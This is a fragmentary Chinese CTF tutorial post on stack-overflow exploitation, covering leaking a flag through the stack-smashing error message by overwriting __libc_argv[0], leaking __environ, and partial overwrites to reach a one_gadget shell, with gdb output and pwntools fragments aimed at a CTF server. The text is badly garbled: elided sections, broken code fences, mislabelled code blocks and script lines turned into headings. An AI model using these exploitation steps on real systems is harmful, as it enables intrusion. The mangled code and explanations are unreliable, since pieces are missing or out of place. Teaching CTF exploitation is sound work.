...
```
基于报错类的栈保护 canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆。..
```
<!-- more -->
...
```
最终会调用fortify_fail函数中的libc_message (2, "* %s : %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") ，关键点来了。一、可以打印信息二、__libc_argv[0]可控制那么__libc_argv[0]是什呢？与打印信息又什么联系？libc_argv[0]则是 argv[ ]指针组的的元素，先看 main函数的原型，void main(int argc, char *argv)。其中参数argc是整数，表示使用命令行运行程序时传递了几个参数； argv[ ]是一个指针数组，用来存放指向你的字符串参数的指针，每一个元素指向一个参数。其中argv[0]指向程序运行的全路径名，也就是程序的名字，比如例子中的。/a.out，argv[1] 指向在命令行中执行程序名后的第一个字符串，以此类推。但是这样看来，libc_argv[0]似乎是不可以控制的，或者只能使用修改程序名来进行控制。继续看这么一个小实验，先看一下这个错误信息是怎么打印的（至于为什么是输出50个字节，随后再探究）。 
```
...
段错误
  ...
  `如果我们在程序中强行修改__libc_argv[0]会怎么样？```java
```
    argv[0] = "stack smash!";
```
}
...
```
![Test](https://api.opics.org/api  '栈溢出技巧（下）') 
```
...
```
  ...
  `因此offset = 536。为了做题的效率，不可能去一个一个尝试，如下：```sql
  gdb-peda$ find /home
...
.data:0000000000600D21 a2c3Theserverha db '2C3_TheServerHasTheFlagHere...',0
  ...
  `只需要将此变量进行显示即可，于是构造payload：```java
```java
...
```
  ...
  `此时选择0x400d20进行构造payload即可成功打印出来。```java
```java
...
本地测试：![Test](https://api.opics.org/api  '栈溢出技巧（下）') 
...
__environ在libc中的偏移量为0x39bf38。![Test](https://api.opics.org/api  '栈溢出技巧（下）') 
...
43:0218│ rsi 0x7fffffffcdf8 —▸ 0x7fffffffd0d6 ◂— '/home/pwn/Desktop/xpl' `计算出偏移量：` pwndbg> i r rbprbp 0x7fffffffcd10 0x7fffffffcd10pwndbg> x /gx 0x7fffffffcd10-0x900x7fffffffcc80: 0x000000037ffffa00pwndbg> distance 0x7fffffffcc80 0x7fffffffcdf80x7fffffffcc80->0x7fffffffcdf8 is 0x178 bytes (0x2f words) `获取flag：` from pwn import * 
...
partial write则是利用了这一点，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的，因此我们可以过覆盖地址的后几位来可以控制程序的执行流。
...
pwn@pwn-PC:~/Desktop$ checksec gets [*] '/home/pwn/Desktop/gets' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)依然没有PIE，但是开了ASLR保护 
  ...
  只有一个gets函数而且存在明显栈溢出漏洞，想象空很大，可以构造execve函数进行getshell，由于开启了ASLR，必须先构造read或者puts函数泄漏libc的地址，但代码段又没有这些函数，依然得需要先知道libc的加载地址。那么既然开启地址随机化，尝试partial overwrite去覆盖返回地址（覆盖成onegadget的地址）达到getshell的目的。
...
因为这个需要概率，因此不知道payload是不是正确还在那一直跑，先调试代码，可以发现都是按照设想去执行  只是没成功，然后就是一直跑，直到跑出shell为止。
...
```
### 五、context.arch = 'amd64'
```
 
```
### 六、context.log_level = 'debug'
```
 
```
### 七、context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
offset = 0x18 
```
...
```
  将[rip + 0x2012ce]=>0x7ffff7a79480 (system)放在栈中位置是hint函的rbp - 0x110，也就是只要执行hint函数，那么system函数就会被放在rbp - 0x110处，而且这个位置很眼熟，在go函数中也有
```
...
### 九、p = process('./1000levels')
p = remote('111.200.241.244',45392) 
 
### 十、one_gadget = 0x3f306
